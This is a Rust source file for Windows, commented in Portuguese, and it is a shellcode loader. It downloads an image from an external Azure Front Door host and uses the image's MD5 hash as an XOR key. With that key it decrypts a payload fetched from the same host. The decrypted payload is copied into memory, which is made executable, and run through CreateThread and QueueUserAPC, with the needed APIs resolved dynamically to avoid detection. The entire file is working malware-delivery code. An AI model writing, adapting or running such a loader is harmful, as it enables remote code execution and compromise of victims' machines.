use std::{
    ffi::{CString, c_void},
    process::exit,
    ptr::{copy, null_mut},
};
//use winapi::um::memoryapi::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::processthreadsapi::{QueueUserAPC, ResumeThread};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winbase::INFINITE;
use winapi::shared::minwindef::{DWORD, LPVOID, TRUE};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winnt::{PAGE_READWRITE, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE};
use winapi::um::synchapi::{WaitForSingleObject, SleepEx};
use core::ptr::copy_nonoverlapping;
use reqwest;
use tokio;
use md5;

type CreateThreadFn = unsafe extern "system" fn(
    LPVOID,
    usize,
    extern "system" fn(*mut c_void) -> DWORD,
    LPVOID,
    DWORD,
    *mut DWORD,
) -> LPVOID;

type VirtualAllocFn = unsafe extern "system" fn(
    LPVOID,
    usize,
    DWORD,
    DWORD,
) -> LPVOID;

type VirtualProtectFn = unsafe extern "system" fn(
    LPVOID,
    usize,
    DWORD,
    *mut DWORD,
) -> i32;

extern "system" fn safe_thread_function(param: *mut c_void) -> DWORD {
    unsafe { function(param) }
}

unsafe extern "system" fn function(param: *mut c_void) -> DWORD {
    println!("Shellcode executado com sucesso!");
    SleepEx(INFINITE, TRUE);
    0
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let loader_url = "https://x41-dzb3auczdsbugyet.z02.azurefd.net/redsc";
    let image_url = "https://x41-dzb3auczdsbugyet.z02.azurefd.net/imagem.jpg";

    // Baixar e calcular o MD5 da imagem
    let xor_key = download_and_calculate_md5(image_url).await?;

    // Converta a chave XOR para uma string hexadecimal e imprima
    let xor_key_hex: String = xor_key.iter().map(|b| format!("{:02x}", b)).collect();
    println!("Chave XOR (MD5 de imagem.jpg): {}", xor_key_hex);

    // Baixar o payload criptografado
    let response = reqwest::get(loader_url).await.expect("Falha ao fazer a requisição");
    let encrypted_payload = response.bytes().await.expect("Falha ao ler os bytes");
    //println!("Payload criptografado recebido: {:?}", encrypted_payload);

    // Descriptografar o payload usando a chave MD5
    let buf: Vec<u8> = encrypted_payload.iter().zip(xor_key.iter().cycle()).map(|(&b, &k)| b ^ k).collect();
    //println!("Payload descriptografado: {:?}", buf);

    unsafe {
        // Obter handle para kernel32.dll
        let kernel32 = GetModuleHandleA(CString::new("kernel32.dll").unwrap().as_ptr());
        if kernel32.is_null() {
            eprintln!("Failed to get module handle for kernel32.dll");
            exit(-1);
        }

        // Obter endereço da função CreateThread
        let create_thread_name = CString::new("CreateThread").unwrap();
        let create_thread: CreateThreadFn = std::mem::transmute(GetProcAddress(kernel32, create_thread_name.as_ptr()));
        if create_thread as *const () == std::ptr::null() {
            eprintln!("Failed to get procedure address for CreateThread");
            exit(-1);
        }

        // Obter endereço da função VirtualAlloc
        let virtual_alloc_name = CString::new("VirtualAlloc").unwrap();
        let virtual_alloc: VirtualAllocFn = std::mem::transmute(GetProcAddress(kernel32, virtual_alloc_name.as_ptr()));
        if virtual_alloc as *const () == std::ptr::null() {
            eprintln!("Failed to get procedure address for VirtualAlloc");
            exit(-1);
        }

        // Obter endereço da função VirtualProtect
        let virtual_protect_name = CString::new("VirtualProtect").unwrap();
        let virtual_protect: VirtualProtectFn = std::mem::transmute(GetProcAddress(kernel32, virtual_protect_name.as_ptr()));
        if virtual_protect as *const () == std::ptr::null() {
            eprintln!("Failed to get procedure address for VirtualProtect");
            exit(-1);
        }

        // Chamada para VirtualAlloc
        let address = virtual_alloc(
            null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if address.is_null() {
            eprintln!("Failed to allocate memory");
            exit(-1);
        }
        println!("Memória alocada em: {:?}", address);

        // Copiar o shellcode para a memória alocada
        copy_nonoverlapping(buf.as_ptr(), address as *mut u8, buf.len());
        println!("Shellcode copiado para a memória alocada");

        // Verificar o conteúdo da memória copiada
        let copied_data: &[u8] = std::slice::from_raw_parts(address as *const u8, buf.len());
        //println!("Dados copiados na memória: {:?}", copied_data);

        // Chamada para VirtualProtect
        let mut oldprotect = 0;
        if virtual_protect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect) == 0 {
            eprintln!("[!] VirtualProtect Failed With Error: {}", GetLastError());
            exit(-1);
        }
        println!("Proteção de memória alterada para execução");

        // Chamada para CreateThread
        let hthread = create_thread(
            null_mut(),
            0,
            safe_thread_function,
            null_mut(),
            0,
            null_mut(),
        );

        if hthread.is_null() {
            eprintln!("[!] CreateThread Failed With Error: {}", GetLastError());
            exit(-1);
        }
        println!("Thread criada com sucesso");

        // Chamada para QueueUserAPC
        if QueueUserAPC(Some(std::mem::transmute(address)), hthread, 0) == 0 {
            eprintln!("[!] QueueUserAPC Failed With Error: {}", GetLastError());
            exit(-1);
        }
        println!("QueueUserAPC chamado com sucesso");

        // Chamada para ResumeThread
        if ResumeThread(hthread) == u32::MAX {
            eprintln!("[!] ResumeThread Failed With Error: {}", GetLastError());
            exit(-1);
        }
        println!("Thread retomada com sucesso");

        // Chamada para WaitForSingleObject
        WaitForSingleObject(hthread, INFINITE);
        println!("Execução do shellcode concluída");
    }

    Ok(())
}

async fn download_and_calculate_md5(url: &str) -> Result<[u8; 16], Box<dyn std::error::Error>> {
    // Baixar a imagem
    let response = reqwest::get(url).await?;
    let bytes = response.bytes().await?;

    // Calcular o hash MD5
    let digest = md5::compute(&bytes);
    let mut key = [0u8; 16];
    key.copy_from_slice(&digest.0);

    Ok(key)
}
